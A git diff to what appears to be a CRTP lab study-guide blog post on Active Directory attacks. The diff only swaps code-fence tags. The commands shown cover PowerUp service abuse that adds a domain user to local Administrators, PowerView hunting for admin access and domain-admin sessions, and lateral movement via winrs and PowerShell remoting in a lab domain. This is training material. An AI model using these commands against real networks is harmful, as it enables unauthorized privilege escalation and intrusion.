@@ -36,7 +36,7 @@ description: Designed to provide a comprehensive guide to Active Directory (AD) 
 
 First step for local privilege escalation, we will try to check for any privilege escalation path. Then if we found any services that can be abused, we can add our domain user to the local admin group.
 
-```bash
+```jsx
 #Check for any priviliege escalation path
 Invoke-AllChecks
 ```
@@ -46,7 +46,7 @@ _Invoke-AllChecks_
 
 Let’s use the abuse function for Invoke-ServiceAbuse and add our current domain user to the 
 local Administrators group. 
-```bash
+```jsx
 #Abuse the service and add our current domain user to the local Administrator group
 Invoke-ServiceAbuse
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
@@ -62,14 +62,14 @@ Now, our user is a local admin !
 Next step, we will try to identify any computers/machines in the domain where our user has local administrative access. 
 
 
-```bash
+```jsx
 #Identify a computer within the network domain where the current user has local admin privileges.
 Find-PSRemotingLocalAdminAccess
 ```
 ![Result](/img/crtp/result3.png){: width="972" height="589" }
 We can connect to the machine who has the local administrative access by using winrs
 
-```bash
+```jsx
 winrs -r:dcorp-adminsrv cmd
 
 #Checking the username and computername in the remote winrs session
@@ -80,7 +80,7 @@ set computername
 
 We can also use PowerShell Remoting
 
-```bash
+```jsx
 Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 ```
 ![Result](/img/crtp/result5.png){: width="972" height="589" }
@@ -89,7 +89,7 @@ Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 
 A request will be sent to Domain Controller to retrieve all ComputerName and membership of the domain admin's group which has admin session there.
 
-```bash
+```jsx
 Find-DomainUserLocation
 ```
 ![Result](/img/crtp/result6.png){: width="972" height="589" }
